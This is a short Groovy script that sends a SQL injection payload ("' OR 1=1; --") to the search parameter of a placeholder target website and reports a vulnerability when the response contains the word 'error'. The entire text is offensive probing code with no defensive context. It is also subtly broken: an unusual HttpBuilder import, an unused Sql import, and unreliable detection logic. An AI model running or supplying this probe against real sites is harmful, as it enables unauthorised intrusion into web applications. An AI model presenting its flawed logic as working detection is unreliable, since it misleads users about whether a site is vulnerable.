import groovy.net.http.HttpBuilder
import groovy.sql.Sql

def url = "http://your-target-website/search?name="
def payload = "' OR 1=1; --"

def http = new HttpBuilder()

def response = http.get(url + payload) { resp ->
    println "Status code: ${resp.statusCode}"
    println "Response body: ${resp.text}"
}

// Assuming the vulnerable application returns a different response when the SQL injection is successful
if (response.statusCode == 200 && response.text.contains("error")) {
    println "SQL injection vulnerability detected!"
} else {
    println "No SQL injection vulnerability found."
}
